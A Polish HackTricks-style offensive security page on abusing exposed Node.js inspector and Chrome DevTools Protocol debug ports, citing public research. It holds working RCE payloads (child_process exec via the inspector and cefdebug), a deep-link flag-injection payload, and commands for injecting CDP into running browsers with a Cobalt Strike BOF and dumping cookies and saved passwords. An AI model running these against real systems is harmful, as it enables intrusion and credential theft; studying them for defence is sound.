# Nadużycia debugowania Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Historyczne praktyczne przykłady obejmują walkthrough Multimaster i atak na debugger Visual Studio Code z wykorzystaniem CVE-2019-1414; należy traktować je jako kontekst zależny od wersji, a nie zakładać, że każdy obecny cel Electron lub Chromium udostępnia te same mechanizmy.<sup>[[1]](#references)[[3]](#references)</sup>

## Podstawowe informacje

[Z dokumentacji](https://nodejs.org/learn/getting-started/debugging): Po uruchomieniu z przełącznikiem `--inspect` proces Node.js nasłuchuje na połączenia klienta debugującego. **Domyślnie** nasłuchuje na hoście i porcie **`127.0.0.1:9229`**. Każdy proces otrzymuje również **unikalny** **UUID**.<sup>[[4]](#references)</sup>

Klienty Inspector muszą znać i podać adres hosta, port oraz UUID, aby nawiązać połączenie. Pełny adres URL będzie wyglądać mniej więcej tak: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Ponieważ **debugger ma pełny dostęp do środowiska wykonawczego Node.js**, złośliwy aktor, który może połączyć się z tym portem, może być w stanie wykonać dowolny kod w imieniu procesu Node.js (**potencjalna eskalacja uprawnień**).<sup>[[4]](#references)</sup>

Istnieje kilka sposobów uruchomienia Inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Po uruchomieniu procesu poddawanego inspekcji pojawi się coś takiego:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Procesy oparte na **CEF** (**Chromium Embedded Framework**) mogą udostępniać debugger za pomocą `--remote-debugging-port=9222`. Udostępnia to przeglądarkę przez [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), a nie inspektor Node.js, więc payloady oparte na Node.js `process` nie mają domyślnie bezpośredniego zastosowania.<sup>[[2]](#references)[[5]](#references)</sup>

Po uruchomieniu przeglądarki z włączonym debugowaniem pojawi się coś takiego:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerowanie endpointu CDP i sterowanie nim

HTTP-owe endpointy wykrywania rozróżniają WebSocket **przeglądarki** od WebSocketów poszczególnych **celów** (kart, workerów, rozszerzeń itp.). Odpytaj `/json/version`, aby uzyskać endpoint przeglądarki, a `/json/list`, aby uzyskać cele; zwrócone wartości `webSocketDebuggerUrl` można następnie bezpośrednio obsługiwać za pomocą komunikatów podobnych do JSON-RPC w CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Na przykład połącz się za pomocą `websocat "$BROWSER_WS"` i wyślij `{"id":1,"method":"Target.getTargets"}` lub `{"id":2,"method":"Storage.getCookies"}`. Na targetcie strony (`websocat "$PAGE_WS"`) `Runtime.evaluate` wykonuje kod w tym rendererze, a `Page.captureScreenshot` zwraca zrzut ekranu zakodowany w base64. `document.cookie` nie ujawnia ciasteczek `HttpOnly`, natomiast `Storage.getCookies` pobiera ciasteczka z magazynu przeglądarki.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Przeglądarki, WebSockety i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Strony internetowe otwarte w przeglądarce mogą wysyłać żądania WebSocket i HTTP zgodnie z modelem bezpieczeństwa przeglądarki. **Początkowe połączenie HTTP** jest konieczne, aby **uzyskać unikalny identyfikator sesji debuggera**. **Same-origin policy** **uniemożliwia** stronom internetowym nawiązanie **tego połączenia HTTP**. Aby dodatkowo zabezpieczyć się przed [**atakami DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js weryfikuje, czy nagłówki **„Host”** połączenia zawierają dokładnie **adres IP** lub **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Te **środki bezpieczeństwa uniemożliwiają wykorzystanie inspectora** do uruchomienia kodu przez **samo wysłanie żądania HTTP** (co można zrobić, wykorzystując podatność SSRF).<sup>[[4]](#references)</sup>

### Uruchamianie inspectora w działających procesach

Możesz wysłać **sygnał SIGUSR1** do działającego procesu nodejs, aby **uruchomić w nim inspector** na domyślnym porcie. Pamiętaj jednak, że musisz mieć wystarczające uprawnienia, więc może to zapewnić **uprzywilejowany dostęp do informacji wewnątrz procesu**, ale nie bezpośrednią eskalację uprawnień.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Jest to przydatne w kontenerach, ponieważ **zamknięcie procesu i uruchomienie nowego** z `--inspect` **nie wchodzi w grę**, gdyż **kontener** zostanie **zakończony** wraz z procesem.<sup>[[6]](#references)</sup>

### Połącz z inspektorem/debuggerem

Aby połączyć się z **przeglądarką opartą na Chromium**, można otworzyć adres `chrome://inspect` lub `edge://inspect`, odpowiednio dla Chrome lub Edge. Po kliknięciu przycisku Configure należy upewnić się, że **host docelowy i port** są poprawnie wymienione. Obraz przedstawia przykład Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Po dostępnym adresie URL pojawi się adres umożliwiający dostęp do debuggera, np. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d — Połącz z inspektorem/debuggerem: Aby połączyć się z przeglądarką opartą na Chromium, ...](<../../images/image (674).png>)

Za pomocą **wiersza poleceń** można połączyć się z debuggerem/inspektorem:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Narzędzie [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) umożliwia **znajdowanie inspektorów** uruchomionych lokalnie i **wstrzykiwanie do nich kodu**.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Pamiętaj, że **exploity RCE w NodeJS nie zadziałają**, jeśli połączysz się z przeglądarką przez [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (musisz sprawdzić API, aby znaleźć ciekawe możliwości jego wykorzystania).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE w debuggerze/inspektorze NodeJS

> [!TIP]
> Jeśli szukasz informacji, jak uzyskać [**RCE z XSS w Electron, sprawdź tę stronę.**](../../desktop-application-security/electron-desktop-apps/index.html)

Typowe sposoby uzyskania **RCE**, gdy możesz **połączyć się** z inspektorem Node, obejmują użycie czegoś w rodzaju (wygląda na to, że **nie zadziała to w połączeniu z Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Ładunki protokołu Chrome DevTools

API można sprawdzić tutaj: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
W tej sekcji wymienię tylko ciekawe rzeczy, które — jak zauważyłem — wykorzystano do exploitowania tego protokołu.

### Ograniczenie dotyczące domyślnego profilu w Chrome 136+

Od **Chrome 136** Chrome ignoruje `--remote-debugging-port` i `--remote-debugging-pipe`, gdy są używane z **domyślnym katalogiem danych Chrome**. Przełącznik musi być użyty wraz z niestandardowym `--user-data-dir`. Oddzielny klucz szyfrowania i izolowany stan przeglądarki zapobiegają ujawnieniu normalnego, uwierzytelnionego profilu użytkownika za pomocą prostej techniki opartej na flagach. Nie należy zakładać, że to ograniczenie specyficzne dla Chrome obejmuje starsze wersje Chrome, Chrome for Testing, aplikacje Electron/CEF ani inne pochodne Chromium bez wcześniejszej weryfikacji.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Dlatego samo zaobserwowanie działającego procesu Chrome uruchomionego wyłącznie z opcją `--remote-debugging-port` **nie dowodzi**, że CDP został aktywowany. Potwierdź, że nasłuchuje port, sprawdź `/json/version` i ustal, który profil jest z nim powiązany.<sup>[[14]](#references)</sup>

### Wstrzykiwanie parametrów przez Deep Links

W przypadku [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) badacze Rhino Security odkryli, że aplikacja oparta na CEF **zarejestrowała w systemie niestandardowy URI** (`workspaces://index.html`), który otrzymywał pełny URI, a następnie **uruchamiał aplikację opartą na CEF** z konfiguracją częściowo budowaną na podstawie tego URI.<sup>[[8]](#references)</sup>

Odkryto, że parametry URI były dekodowane z URL-a i używane do uruchomienia podstawowej aplikacji CEF, co pozwalało użytkownikowi **wstrzyknąć** flagę **`--gpu-launcher`** do **wiersza poleceń** i wykonywać dowolne polecenia.<sup>[[8]](#references)</sup>

Zatem payload może wyglądać tak:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Uruchomi calc.exe.<sup>[[8]](#references)</sup>

### Nadpisywanie plików

Zmień folder, w którym **będą zapisywane pobrane pliki**, i pobierz plik, aby **nadpisać** często używany **kod źródłowy** aplikacji swoim **złośliwym kodem**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE i eksfiltracja przez WebDriver

STAR Labs pokazało, że ujawnione usługi WebDriver/CDP mogą umożliwić odczyt dowolnych plików i RCE; w niektórych konfiguracjach DNS rebinding może dopełnić łańcuch exploita.<sup>[[9]](#references)</sup>

Usługa WebDriver w ChromeDriver jest odrębna od Chrome DevTools/CDP. Możliwość [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) wskazuje plik wykonywalny przeglądarki uruchamianej dla nowej sesji. Jeśli nieuprzywilejowany użytkownik może uzyskać dostęp do usługi ChromeDriver działającej jako root i utworzyć sesję z kontrolowaną przez siebie ścieżką do pliku wykonywalnego, uruchomienie może przekroczyć granicę uprawnień usługi. Pusta odpowiedź `/sessions` nie rozstrzyga, czy można tworzyć nowe sesje. Zanim uznasz, że ta ścieżka jest możliwa do wykorzystania, sprawdź właściciela procesu, rzeczywistą dostępność nasłuchującego portu, autoryzację sesji, dostęp do pliku wykonywalnego i mechanizmy ograniczające uprawnienia; sama nazwa procesu lub typowy port nie wystarczą. [Wytyczne bezpieczeństwa Google](https://developer.chrome.com/docs/chromedriver/security-considerations) zalecają uruchamianie ChromeDriver na nieuprzywilejowanym koncie. Pasywne rozpoznanie nie powinno tworzyć sesji WebDriver.

Więcej historycznych przypadków dotyczących automatyzacji przeglądarek i bezpieczeństwa Chromium opisano w opracowaniu Counter WebDriver oraz w zgłoszeniach Project Zero 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Włączanie CDP w działającym procesie Chromium

Ograniczenie Chrome dotyczące domyślnego profilu blokuje tylko aktywację z wiersza poleceń. Przy wystarczającym dostępie tego samego użytkownika do modyfikowania procesu przeglądarki oryginalny [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) i [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) dla Cobalt Strike wywołują nieeksportowaną funkcję Chromium `content::DevToolsAgentHost::StartRemoteDebuggingServer` wewnątrz już działającego procesu `chrome.exe` lub `msedge.exe`. Endpoint należy więc do rzeczywistego profilu i zachowuje jego karty, rozszerzenia, pliki cookie oraz uwierzytelniony stan.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

W typowych 64-bitowych procesach Chrome/Edge BOF znajduje okno przeglądarki oraz załadowaną bibliotekę `chrome.dll`/`msedge.dll`, skanuje zdalny PE w poszukiwaniu sygnatur z maskami, alokuje stuby i blok kontekstu, tymczasowo zastępuje procedurę okna, a następnie wykonuje końcowe wywołanie w **UI thread** przeglądarki. Istotne dane wejściowe w czasie działania to `StartRemoteDebuggingServer`, `operator new` Chromium, `TCPServerSocketFactory::CreateForHttpServer` oraz vtable fabryki. Wykonanie zostaje przerwane, jeśli którakolwiek z wymaganych sygnatur nie ma dokładnie jednego dopasowania.<sup>[[15]](#references)[[16]](#references)</sup>

BOF przyjmuje tryb przeglądarki i opcjonalny port. Następnie jego skrypt pomocniczy może zweryfikować endpoint i zebrać pliki cookie; `chrome-iso` to odrębna ścieżka dotycząca granicy izolacji procesów Windows w Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Ścieżka `chrome-iso` używa wyłącznie uchwytów z ograniczonymi uprawnieniami do zapytań do izolowanego procesu. Identyfikuje zainstalowany plik `chrome.dll`, którego rozmiar obrazu PE odpowiada rozmiarowi obrazu działającego procesu, rozwiązuje symbole z tego lokalnego obrazu, a następnie wykorzystuje mechanizm dyspozycji `WindowImpl` Chromium wraz z synchronicznym `WM_COPYDATA` i istniejącym hookiem User32 załadowanym do obrazu, aby dotrzeć do wątku UI.<sup>[[16]](#references)</sup>

> [!WARNING]
> Jest to technika **manipulacji procesem przeglądarki po uzyskaniu do niego dostępu**, a nie obejście uwierzytelniania przez sieć. Zależy od wersji builda, ponieważ odpowiednie symbole C++ nie są eksportowane i mogą się zmienić po aktualizacjach przeglądarki.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Odświeżanie sygnatur po aktualizacjach przeglądarki

Użyj dokładnej wersji pliku `chrome.dll` lub `msedge.dll` zainstalowanej na celu oraz odpowiadającego jej pliku PDB. `symchk.exe` z Windows SDK pobiera symbole; skrypty repozytorium znajdują następnie `StartRemoteDebuggingServer`, ustalają parametry alokatora i fabryki gniazd albo sprawdzają każdą sygnaturę zawartą w BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Wyniku z zerową lub wieloma liczbą trafień nie należy zastępować arbitralnym adresem. Jeśli znany wzorzec `operator new` lub `CreateForHttpServer` zmienił się na tyle, że nie można użyć go do utworzenia nowej maski, użyj `pe_signature_finder.py` z PDB, aby sprawdzić ten symbol i wyznaczyć sekwencję bajtów unikalną w module docelowym.<sup>[[16]](#references)[[18]](#references)</sup>

#### Ekstrakcja z uwierzytelnionej przeglądarki za pomocą CDP Toolkit

Ta technika nie odszyfrowuje offline App-Bound Encryption (ABE) ani nie usuwa powiązania z urządzeniem. Zamiast tego traktuje legalną przeglądarkę jako **oracle deszyfrujący i proxy uwierzytelnionych interakcji**: `Storage.getCookies` pobiera dane z magazynu cookies działającej przeglądarki, a przepływy nawigacji i screencastu utrzymują żądania, pamięć masową, uwierzytelnianie firmowe i zachowanie powiązane z urządzeniem w istniejącej przeglądarce ofiary.<sup>[[17]](#references)[[18]](#references)</sup>

Po przekierowaniu nasłuchującego lokalnie CDP przez pivot operatora [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) może wyliczać i zbierać typowe artefakty.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` i `tabs screenshot` to głównie wrappery dla `/json/version`, listy targetów, `Storage.getCookies` i `Page.captureScreenshot`. Historia, zakładki, rozszerzenia i metadane haseł wymagają natomiast tymczasowego targetu WebUI `chrome://`/`edge://`: toolkit czeka, aż interfejs się wyrenderuje, sprawdza jego model lub DOM, zbiera wynik i zamyka target.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` idzie o krok dalej: otwiera origin zapisanych loginów, ustawia fokus na polu poświadczeń, wybiera natywną sugestię autouzupełniania za pomocą zdarzeń wejściowych CDP i odczytuje wypełnione wartości. Origin/port/ścieżka muszą dokładnie odpowiadać realm zapisanych haseł; tryb widoczny jest niezawodnym ustawieniem domyślnym, ponieważ okno sugestii jest natywnym interfejsem przeglądarki.<sup>[[17]](#references)[[18]](#references)</sup>

Do interakcji na żywo `browser-takeover screencast` strumieniuje klatki i wysyła dane wejściowe do rzeczywistego targetu (również w trybie działania w tle lub poza ekranem). `browser-takeover proxy` zamiast tego lokalnie obsługuje HTTP i HTTPS `CONNECT`, a żądania upstream realizuje przez ukryte targety Chrome; gdy ukryte targety są niedostępne, używa kart działających w tle. Zachowuje to kontekst sieciowy i uwierzytelniania ofiary, ale gorzej odwzorowuje działanie złożonych aplikacji klienckich, ponieważ przeglądarka operatora renderuje zwróconą treść.<sup>[[17]](#references)[[18]](#references)</sup>

W celu wykrywania nie polegaj wyłącznie na telemetrii wiersza poleceń `--remote-debugging-*`: koreluj też nietypowe uchwyty i operacje pamięci dotyczące procesów przeglądarki (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, tworzenie wątków), wstrzykiwanie DLL oraz nieoczekiwane nasłuchujące gniazda loopback należące do Chrome/Edge.<sup>[[15]](#references)</sup>

### Post-Exploitation

W rzeczywistym środowisku i **po przejęciu** komputera użytkownika z przeglądarką opartą na Chromium historyczna technika polegała na ponownym uruchomieniu przeglądarki z włączonym debugowaniem i przekierowaniu portu loopback. Może to ujawnić stan przeglądania ofiary w produktach/kompilacjach, które nadal akceptują wybrany profil, ale Chrome 136+ nie zastosuje tego do domyślnego katalogu danych.<sup>[[7]](#references)[[14]](#references)</sup>

Oryginalne polecenie ponownego uruchomienia zachowano poniżej dla starszych lub specyficznych dla danej wersji celów. Drugie polecenie to obsługiwany sposób dla bieżącej wersji Chrome, ale tworzy odizolowany profil zamiast ponownie otwierać zwykły, uwierzytelniony profil ofiary.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

W przypadku specyficznych dla macOS technik ponownego uruchamiania Chromium, rozszerzeń i CDP zobacz [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - narzędzie do inspekcji i exploitacji debuggera CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: zdalne wykonanie kodu w Visual Studio Code przez debugger Chrome DevTools](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Przewodnik debugowania Node.js - pierwsze kroki](https://nodejs.org/learn/getting-started/debugging)
- [5] [Protokół Chrome DevTools](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-exploitation: nadużywanie funkcji debugowania Chrome do zdalnego obserwowania i kontrolowania sesji przeglądania](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: zdalne wykonanie kodu w AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Rozmawiasz ze mną? RCE w WebDriverze przez DNS rebinding i CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - od bota do RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Zgłoszenie 773 w Google Project Zero (system śledzenia błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Zgłoszenie 1742 w Google Project Zero (system śledzenia błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Zgłoszenie 1944 w Google Project Zero (system śledzenia błędów Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Zmiany w przełącznikach zdalnego debugowania zwiększające bezpieczeństwo - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Wstrzykiwanie CDP do działającej przeglądarki Edge: dogłębna analiza instrumentacji przeglądarki w czasie działania](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Powrót Ciasteczkowego Potwora](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
